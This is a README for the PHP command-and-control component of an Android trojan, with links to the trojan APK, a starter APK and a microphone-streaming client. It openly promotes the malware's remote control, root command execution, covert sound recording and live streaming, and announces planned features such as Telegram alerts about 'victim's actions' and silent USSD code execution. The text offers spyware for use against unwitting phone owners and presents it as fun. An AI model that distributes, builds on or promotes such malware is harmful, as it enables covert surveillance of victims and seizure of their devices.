# Android Trojan (Built with Android SDK 22) source code
The main manual is here: https://github.com/androidtrojan1/android-trojan-service-
UPD. 11.02.2016 Version 1.2 released!

DESCRIPTION:

This is the PHP part that you should put to your server html root folder. The trojan will try to upload the records to and try to get
new commmands from here. It's recommended to set -rw privileges on all files. (to allow writing to and creating new files)

HERE ARE LINKS TO THE OTHER COMPONENTS:

trojan service apk: https://github.com/androidtrojan1/android-trojan-service-

mic streamer pc client: https://github.com/androidtrojan1/android-trojan-streamer

trojan starter apk : https://github.com/androidtrojan1/android-trojan-starter-



Android trojan with abilities of remote control,root commands execution, recording and online sound streaming

Compatible with all Android from Gingerbread (API 10) up to Lollipop (API 22)





have fun!

Upd. 11.09.2016  New Update is coming. New features in the upcoming version:
*  Telegram real-time notifications about victim's actions
*  silent execution of ussd codes
*  more interesting root features ^^
